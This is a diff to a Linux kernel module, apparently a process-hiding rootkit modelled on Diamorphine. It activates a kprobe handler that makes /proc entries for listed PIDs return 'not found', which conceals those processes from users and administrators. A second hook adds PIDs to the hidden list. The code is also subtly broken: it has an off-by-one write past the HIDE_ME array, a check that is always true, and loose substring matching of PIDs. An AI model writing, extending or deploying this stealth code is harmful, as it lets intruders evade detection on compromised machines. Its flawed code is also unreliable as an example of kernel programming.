@@ -1,14 +1,20 @@
 #include <asm-generic/errno-base.h>
+#include <asm/uaccess.h>
 #include <linux/cred.h>
+#include <linux/dirent.h>
+#include <linux/fdtable.h>
 #include <linux/kernel.h>
 #include <linux/kprobes.h>
 #include <linux/list.h>
 #include <linux/module.h>
 #include <linux/pid.h>
+#include <linux/proc_ns.h>
 #include <linux/sched.h>
 #include <linux/sched/signal.h>
 #include <linux/signal.h>
 #include <linux/slab.h>
+#include <linux/string.h>
+#include <linux/syscalls.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("ceald");
@@ -29,6 +35,7 @@ const char *name;
 
 pid_t HIDE_ME[32];
 size_t HIDE_ME_COUNT = 0;
+#define HIDE_ME_MAX 32
 
 static inline void
 tidy(void) { // more sneaky beaky stuff (copied from Diamorphine)
@@ -108,7 +115,7 @@ static unsigned long get_syscall_return_addr(struct pt_regs *regs) {
 }
 static bool is_hidden(pid_t pid) {
   int i;
-  for (i = 0; i < 32; i++) {
+  for (i = 0; i < HIDE_ME_MAX; i++) {
     if (HIDE_ME[i] == pid) {
       return true;
     }
@@ -116,33 +123,32 @@ static bool is_hidden(pid_t pid) {
   return false;
 }
 
-static int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
-  //  struct pt_regs *real_regs;
-  //  const char __user *user_filename;
-  //  char filename[256];
-  //  long bytes;
-  //  pid_t target_pid;
-  //
-  //  real_regs = (struct pt_regs *)regs->di;
-  //  user_filename = (const char __user *)real_regs->si;
-  //  bytes = strncpy_from_user(filename, user_filename, sizeof(filename) - 1);
-  //  int len = snprintf(NULL, 0, "%d", target_pid);
-  //  char *target_pid_str = kmalloc(len + 1, GFP_KERNEL);
-  //  snprintf(target_pid_str, len + 1, "%d", target_pid);
-  //
-  //  if (bytes > 0) {
-  //    filename[bytes] = '\0';
-  //    if (strstr(filename, target_pid_str) != NULL) {
-  //      if (is_hidden(target_pid)) {
-  //        printk(KERN_INFO "Opening /proc file: %s by %s (PID: %d)\n",
-  //        filename,
-  //               current->comm, current->pid);
-  //        regs->ax = -ENOENT;
-  //        regs->ip = get_syscall_return_addr(regs);
-  //      }
-  //    }
-  //  }
+int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
+  struct pt_regs *real_regs;
+  const char __user *user_filename;
+  char filename[256];
+  long bytes;
 
+  real_regs = (struct pt_regs *)regs->di;
+  user_filename = (const char __user *)real_regs->si;
+  bytes = strncpy_from_user(filename, user_filename, sizeof(filename) - 1);
+  if (bytes > 0) {
+    filename[bytes] = '\0';
+    if (sizeof(filename) != 0) {
+      int i;
+      for (i = 0; i < HIDE_ME_MAX; i++) {
+        char str[20];
+        sprintf(str, "%d", HIDE_ME[i]);
+        if (strstr(filename, str) && HIDE_ME[i] != 0) {
+          printk(KERN_INFO "Opening /proc file: %s by %s (PID: %d)\n", filename,
+                 current->comm, current->pid);
+          regs->ax = -ENOENT;
+          regs->ip = get_syscall_return_addr(regs);
+          return 1;
+        }
+      }
+    }
+  }
   return 0;
 }
 
@@ -198,7 +204,7 @@ static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
       }
     }
     printk(KERN_INFO "hiding: %d\n", kill_this_pid);
-    if (HIDE_ME_COUNT < 33) {
+    if (HIDE_ME_COUNT < HIDE_ME_MAX + 1) {
       HIDE_ME[HIDE_ME_COUNT++] = kill_this_pid;
     } else {
       printk(KERN_INFO "cannot hide anymore!\n");
